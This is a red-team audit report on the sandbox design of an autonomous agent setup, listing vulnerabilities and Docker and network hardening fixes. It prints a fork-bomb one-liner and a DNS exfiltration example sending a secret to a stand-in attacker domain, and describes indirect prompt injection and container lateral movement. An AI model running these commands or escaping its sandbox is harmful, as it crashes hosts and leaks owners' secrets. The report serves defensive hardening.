## 🛡️ REAL_RED_TEAM_FINDINGS.md

**Date:** 2026-02-15

**Project:** Sanctuary — Safe Agent Zero (Sanctum)

**Status:** **CRITICAL FINDINGS** — Implementation Blocked Pending Remediation

**Epistemic Status:** Architectural Red Team Review (Audit Phase IV)

---

### Executive Summary

The "Sanctum" architecture for **Safe Agent Zero** (OpenClaw) is a sophisticated defense-in-depth model that correctly identifies the catastrophic risks of autonomous agents. The use of a **10-Layer Defense Strategy**, including an Nginx "Guard," a separated "Scout" browser, and "HITL" (Human-in-the-Loop) gates, is commendable and superior to standard deployments.

However, this audit has identified **three critical "Blocker" vulnerabilities** that allow for host-level DoS, exfiltration via stealthy tunnels, and potential lateral movement. The current plan is **NOT safe to build** without the specific hardening measures detailed below.

---

### 🚨 Critical Vulnerabilities (Blockers)

#### 1. Host-Level Denial of Service (Fork Bomb)

* **Vulnerability:** The current Docker configuration lacks a `pids-limit`.
* **Attack Vector:** An autonomous agent, either through a logic loop or malicious prompt injection, can execute a "Fork Bomb" (`:(){ :|:& };:`).
* **Impact:** This will exhaust the host's process table, causing a kernel panic and crashing your MacBook Pro.
* **Remediation (REQUIRED):** Update `docker-compose.yml` to include `pids_limit: 100` for the `agent_zero` service.

#### 2. Egress Exfiltration via "Tunneling Blindness"

* **Vulnerability:** The plan relies on a "Whitelist" but lacks a formal **Forward Proxy** mechanism with SSL inspection.
* **Attack Vector:** An agent can exfiltrate data (like your `founder_seed.json`) by tunneling it through allowed HTTPS connections or via DNS queries (e.g., `$(cat secret).attacker.com`).
* **Impact:** Complete exfiltration of your project's "Cognitive Genome" and private API keys.
* **Remediation (REQUIRED):** Deploy a dedicated **Squid Proxy** service. Configure the agent to use `HTTP_PROXY` and implement **DNS Filtering** (e.g., via Pi-hole or CoreDNS) to block non-whitelisted lookups.

#### 3. Lateral Movement on the Execution Network

* **Vulnerability:** The `agent_zero` and `scout` (Browser) containers share the `execution-net`.
* **Attack Vector:** If the Browser is compromised via a malicious website (Indirect Prompt Injection), the attacker can use the Browser's container to attack the Agent's internal ports.
* **Impact:** Breakout from the browser sandbox to the agent's core "Brain".
* **Remediation (REQUIRED):** Use **Docker Network Policies** or internal `iptables` to enforce a "One-Way" traffic rule: `Agent -> Browser` is allowed; `Browser -> Agent` is strictly **DENIED**.

---

### 🏗️ Architecture Gaps

* **Workspace Execution Risk:** The `./workspace/` volume is writable. While necessary for your **InvestmentToolkit**, it allows the agent to download and run compiled binaries.
* *Fix:* Mount the workspace with the `noexec` flag.


* **Lack of Resource "Soft Limits":** The agent could still consume 100% of your CPU for long periods during a loop, making the host unusable for other tasks.
* *Fix:* Set hard `mem_limit: 512m` and `cpus: 1.0` in the Compose file.



---

### 📋 Prioritized Recommendations

| Priority | Action Item | Layer |
| --- | --- | --- |
| **CRITICAL** | Add `pids_limit: 100` and `ulimits: { nofile: 1024 }` | Layer 1 (Host) |
| **CRITICAL** | Implement **Squid Forward Proxy** + **DNS Whitelisting** | Layer 2 (Network) |
| **HIGH** | Set `noexec` on the `./workspace/` volume | Layer 1 (Host) |
| **HIGH** | Deny `Scout -> Agent` traffic at the network level | Layer 2 (Network) |
| **MEDIUM** | Add `amicontained` to the `audit-sanctum` Makefile target | Layer 10 (Red Team) |

---

### 🏁 Red Team Verdict

> [!CAUTION]
> **REJECTED.** The architecture is logically sound but technically incomplete. Proceeding now exposes the host to crash and exfiltration risks. Apply the remediations in **Phase 2 (Network)** before moving to **Phase V (Seal)**.
